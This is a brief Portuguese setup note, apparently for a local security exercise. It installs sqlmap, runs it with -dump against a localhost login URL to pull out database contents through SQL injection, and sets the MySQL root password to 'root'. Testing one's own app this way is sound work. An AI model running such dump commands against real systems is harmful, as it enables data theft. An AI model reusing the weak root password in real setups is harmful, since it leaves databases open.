# Instalar sqlmap
<pre>
    brew install sqlmap
</pre>
https://formulae.brew.sh/formula/sqlmap

## usar sqlmap
<pre>
    sqlmap -u http://localhost:3000/logar?email=danilo%4099run.com&senha=123456 -dump
</pre>

# Colocar senha no banco de dados
<pre>
mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';
mysql> FLUSH PRIVILEGES;
mysql> quit
</pre>
